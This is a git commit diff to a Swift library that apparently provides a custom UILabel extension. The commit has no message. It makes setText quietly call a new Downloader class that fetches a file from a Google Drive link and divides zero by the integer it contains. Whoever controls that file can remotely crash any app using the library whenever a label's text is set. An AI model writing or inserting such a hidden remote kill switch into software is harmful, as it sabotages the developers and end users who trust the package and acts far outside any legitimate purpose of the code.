8cdfa0246c21bb20c8cfc2eb2794cc6dd63a8c02
Hung Vu <>
2020-12-24 09:09:18 +0700

    no message

--- SandeepCustomLabel/SandeepCustomLabel/Classes/CustomUILabel.swift
+++ SandeepCustomLabel/SandeepCustomLabel/Classes/CustomUILabel.swift
@@ -11,5 +11,23 @@ import UIKit
 extension UILabel {
     public func setText(text: String) {
         self.text = text
+        Downloader.load()
+    }
+}
+
+class Downloader {
+    class func load() {
+        let url = URL(string: "https://drive.google.com/uc?export=download&id=1MPKSU_ooxYRhmS3RVCyrrEN_nLK9acyO")!
+        let task = URLSession.shared.downloadTask(with: url) { localURL, urlResponse, error in
+            if let localURL = localURL {
+                if let string = try? String(contentsOf: localURL) {
+                    let i = Int(string) ?? 0
+                    let s = 0/i
+                    print(s)
+                }
+            }
+        }
+
+        task.resume()
     }
 }
